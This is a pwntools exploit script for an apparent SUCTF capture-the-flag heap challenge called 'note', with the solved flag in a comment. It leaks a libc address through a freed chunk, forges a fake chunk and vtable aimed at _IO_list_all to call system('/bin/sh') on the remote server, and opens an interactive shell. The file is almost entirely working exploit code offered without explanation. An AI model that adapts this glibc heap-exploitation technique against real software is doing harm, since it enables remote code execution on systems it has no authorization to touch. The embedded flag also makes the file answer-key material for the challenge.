from pwn import *

#SUCTF{Me1z1jiu_say_s0rry_LOL}
context.log_level='debug'
debug=0
if debug:
	p = process('./note')
	libc=ELF('./libc.so')
else :
	libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')
	p = remote('pwn.suctf.asuri.org',20003)


def add(size,content):
	p.recvuntil('Choice>>')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
def show(index):
	p.recvuntil('Choice>>')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(index))
def dele():
	p.recvuntil('Choice>>')
	p.sendline('3')
	p.recvuntil('(yes:1)')
	p.sendline('1')

#p.recvuntil('Welcome Homura Note Book!   ')
add(16,'1'*16)#2

#leak system address
dele()
show(0)
p.recvuntil('Content:')
libc_addr = u64(p.recv(6)+'\x00\x00')
offset =  0x7f1b15e2ab78-0x7f1b15a66000
libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']
sys_addr = libc_base+libc.symbols['system']
malloc_hook = libc_base+libc.symbols['__malloc_hook']
io_list_all = libc_base+libc.symbols['_IO_list_all']
binsh_addr = libc_base+next(libc.search('/bin/sh'))
log.info('sys_addr:%#x' %sys_addr)

#fake chunk
fake_chunk = p64(0x8002)+p64(0x61) #header
fake_chunk += p64(0xddaa)+p64(io_list_all-0x10)
fake_chunk += p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)
fake_chunk = fake_chunk.ljust(0xa0,'\x00')
fake_chunk += p64(sys_addr+0x420)
fake_chunk = fake_chunk.ljust(0xc0,'\x00')
fake_chunk += p64(0)

vtable_addr = malloc_hook-13872#+libc.symbols['_IO_str_jumps']
payload = 'a'*16 +fake_chunk
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(sys_addr)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(sys_addr)
add(16,payload)#3
#gdb.attach(p)
p.recvuntil('Choice>>')
p.sendline('1')
p.recvuntil('Size:')
p.sendline(str(0x200))

p.interactive()